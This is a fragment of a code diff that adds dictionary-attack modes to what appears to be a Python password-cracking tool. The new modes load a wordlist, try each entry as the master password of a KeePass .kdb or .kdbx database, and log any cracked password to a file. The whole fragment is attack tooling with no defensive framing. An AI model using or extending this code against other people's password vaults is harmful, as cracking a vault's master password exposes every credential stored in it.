+                print(f"{Colors.WARNING}[!] Dictionary file is required for --kdb2hack mode.{Colors.ENDC}")
+                return
+            if args.verbose:
+                print(f"{Colors.OKCYAN}[*] Starting crack on KeePass kdb file: {args.kdb2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_kdb_password(args.kdb2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked KeePass kdb password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.kdb2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack KeePass kdb password.{Colors.ENDC}")
+            return
+
+        if args.kdbx2hack:
+            if not args.dictionary:
+                    print(f"{Colors.WARNING}[!] Dictionary file is required for --kdbx2hack mode.{Colors.ENDC}")
+                    return
+            if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Starting crack on KeePass kdbx file: {args.kdbx2hack}{Colors.ENDC}")
+            with open(args.dictionary, 'r', encoding='latin-1') as f:
+                passwords = [line.strip('\r\n') for line in f if line.strip()]
+            total = len(passwords)
+            for idx, password in enumerate(passwords, 1):
+                if args.verbose:
+                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
+                if try_kdbx_password(args.kdbx2hack, password, args.verbose):
+                    print(f"{Colors.OKGREEN}[+] Cracked KeePass kdbx password: {password}{Colors.ENDC}")
+                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
+                    log_cracked_password(args.kdbx2hack, password)
+                    return
+            print(f"{Colors.FAIL}[-] Failed to crack KeePass kdbx password.{Colors.ENDC}")
             return
 
     elif args.mode == 3:
